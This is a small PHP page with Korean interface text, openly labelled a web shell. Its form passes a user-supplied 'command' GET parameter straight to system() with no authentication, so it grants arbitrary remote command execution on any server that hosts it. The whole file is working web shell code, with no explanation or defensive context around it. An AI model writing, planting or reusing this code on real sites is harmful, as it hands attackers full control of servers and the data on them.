<?php
if (isset($_GET['command'])) {
    $command = $_GET['command'];
    // 명령어 실행
    $output = system($command);
}
?>

<div class="container mt-5">
    <h2>웹 쉘</h2>
    <form action="index.php" method="get">
        <input type="hidden" name="cmd" value="shell">
        <div class="mb-3">
            <label for="command" class="form-label">명령</label>
            <input type="text" class="form-control" id="command" name="command" placeholder="실행할 명령어를 입력하세요">
        </div>
        <button type="submit" class="btn btn-primary">실행</button>
    </form>

    <?php if (isset($output)): ?>
        <h3 class="mt-4">결과:</h3>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>
</div>
